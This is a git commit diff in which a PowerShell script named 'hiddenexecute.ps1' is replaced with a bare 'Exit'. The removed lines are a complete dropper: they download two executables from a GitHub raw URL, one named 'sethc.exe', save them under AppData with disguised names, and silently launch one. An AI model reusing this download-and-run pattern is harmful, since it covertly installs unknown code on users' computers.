f09555ea90538f1efaa86f2e98d4402cd28ef42e
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-15 16:23:10 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,14 +1,1 @@
-$serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceasservice.exe"
-$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/sethc.exe"
-$servicePath = "$env:USERPROFILE\AppData\Local\ceasservice.exe"
-$popupPath = "$env:USERPROFILE\AppData\Local\ceas.exe"
-
-Invoke-WebRequest -Uri $serviceURL -OutFile $servicePath
-
-Start-Sleep -Seconds 1
-
-Invoke-WebRequest -Uri $popupURL -OutFile $popupPath
-
-Start-Sleep -Seconds 1
-
-Start-Process $servicePath
+Exit
